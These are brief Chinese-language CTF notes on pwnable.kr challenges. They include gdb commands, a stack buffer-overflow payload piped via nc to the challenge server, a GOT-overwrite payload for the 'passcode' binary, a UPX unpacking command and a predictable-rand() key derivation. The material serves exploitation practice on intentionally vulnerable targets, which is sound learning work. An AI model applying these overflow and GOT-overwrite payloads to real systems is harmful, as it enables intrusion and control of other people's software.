# pwnable.kr

## fd

## collision

## bof

-   动态调试
    -   设置断点: `b main`
    -   开始运行: `r`
    -   单步调试: `n`
    -   单步步入：`s`
    -   创建一个64字节的测试 payload: `pattern create 64`
    -   查看目标地址: `p $ebp+0x8`
    -   查看地址状态: `telescope 25`
    -   故构造payload: `(python -c 'print "A" * 52 + "\xbe\xba\xfe\xca"'; cat -) | nc pwnable.kr 9000`
-   静态调试
    -   `s=$esp+1ch`
    -   `a1=$esp+50h`
    -   `payload = 'j' * 52 + p32(key)`

## flag

-   `upx -q -d flag -ofalg_upx`

## passcode

-   `name`可溢出
-   `scanf`使用错误，导致将输入值写入到`passcod1`的值所代表的地址上（即`passcode1`的地址上存的内容将被视为输入的目标地址）
    -   `mov edx, [ebp+var_10]`应为`lea edx, [ebp+var_10]`
-   利用`name`溢出将`passcode1`内容覆盖为`GOT`内某个函数的地址，然后输入值设为某个想要作为替代（可获得flag）的代码地址
-   `python -c "print 'j'*0x60+'\x04\xa0\x04\x08'+ '134514147\n'" | ./passcode`

## random

-   `rand()` 若没有提供参数会在当前环境使用同一随机种子来生成随机数
-   而通过测试，服务器上 `rand()` 生成的默认随机数值为 `1804289383`, 故 `key = 1804289383 ^ 0xdeadbeef = 3039230856`

## mistake
